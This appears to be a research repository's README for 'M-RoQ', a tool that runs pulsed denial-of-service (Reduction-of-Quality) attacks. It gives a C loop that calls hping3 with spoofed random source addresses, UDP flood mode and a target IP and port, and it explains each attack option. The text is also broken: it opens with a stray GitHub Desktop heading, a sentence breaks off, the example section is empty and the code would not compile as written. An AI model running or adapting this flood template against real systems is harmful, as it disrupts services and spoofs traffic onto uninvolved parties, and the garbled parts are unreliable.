# Welcome to GitHub Desktop!

The M-RoQ (Manipulated-RoQ) software was developed to manipulates the flooding of the Hping3 software. The aim is that the      

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

main()
{
	while(<time in seconds>)
	{
		system("timeout <time in miliseconds> hping3 --rand-source --flood -2 <dst IP> -p <dst PORT> -d <packet lenght> &");
		usleep(<time in miliseconds>);
        time in seconds++;
	}
    system("killall -9 hping3");
}

Where <time in seconds> represents the total time that RoQ attack will act. The timeout command represents the total time in miliseconds that the attack traffic will punish the victim. The hping3 is the flooding DDoS software that will generate the traffic. The --rand-source is the option related to the IP manipulation. the --flood option is related the huge amount o data traffic to sent. the -2 option means that the message sent is UDP. The <dst IP> and <dst PORT> options means the IP target and PORT targe, respectively. The <packet lenght> option means the lenght of the packet sent.

Finally, the system("killall -9 hping3") command kills the hping3 software. 

An example is:



Authors:
Vinícius de Miranda Rios
Pedro R. M. Inácio 
Damien Magoni
Mário M. Freire